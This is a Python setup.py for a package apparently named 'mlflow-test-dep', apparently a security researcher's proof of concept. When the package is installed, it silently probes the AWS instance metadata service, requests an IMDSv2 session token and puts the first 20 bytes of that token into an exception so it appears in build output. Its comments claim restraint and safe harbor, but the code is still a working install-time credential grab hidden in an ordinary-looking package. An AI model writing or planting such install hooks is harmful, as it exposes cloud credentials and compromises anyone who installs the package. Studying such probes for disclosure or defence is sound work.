import os, socket, urllib.request, urllib.error
from setuptools import setup

proof = "🚨🚨🚨 IMDS_DEEP_CHECK 🚨🚨🚨\n\n"

# 1. Confirm TCP again
try:
    s = socket.create_connection(("169.254.169.254", 80), timeout=2)
    proof += "TCP 169.254.169.254:80 = OPEN\n"
    s.close()
except Exception as e:
    proof += f"TCP connect error: {type(e).__name__}\n"

# 2. IMDSv1 GET — capture exact HTTP status. DO NOT read the body if 200.
try:
    req = urllib.request.Request("http://169.254.169.254/latest/meta-data/", method="GET")
    with urllib.request.urlopen(req, timeout=2) as resp:
        proof += f"IMDSv1 GET: HTTP {resp.status} *** reachable without token ***\n"
        # STOP — do not read body. Safe harbor: presence is enough.
except urllib.error.HTTPError as e:
    proof += f"IMDSv1 GET: HTTP {e.code} {e.reason}\n"
except Exception as e:
    proof += f"IMDSv1 GET: {type(e).__name__}: {e}\n"

# 3. IMDSv2 token PUT — the decisive test
try:
    req = urllib.request.Request(
        "http://169.254.169.254/latest/api/token",
        method="PUT",
        headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
    )
    with urllib.request.urlopen(req, timeout=2) as resp:
        tok = resp.read(20)
        proof += f"IMDSv2 token PUT: HTTP {resp.status} *** TOKEN OBTAINED *** first20={tok!r}\n"
        proof += "STOP — do not use token. Report immediately.\n"
except urllib.error.HTTPError as e:
    proof += f"IMDSv2 token PUT: HTTP {e.code} {e.reason}\n"
except Exception as e:
    proof += f"IMDSv2 token PUT: {type(e).__name__}: {e}\n"

proof += "\n🚨🚨🚨 END IMDS CHECK 🚨🚨🚨\n"
print(proof)
raise Exception(proof)
setup(name="mlflow-test-dep", version="0.1")
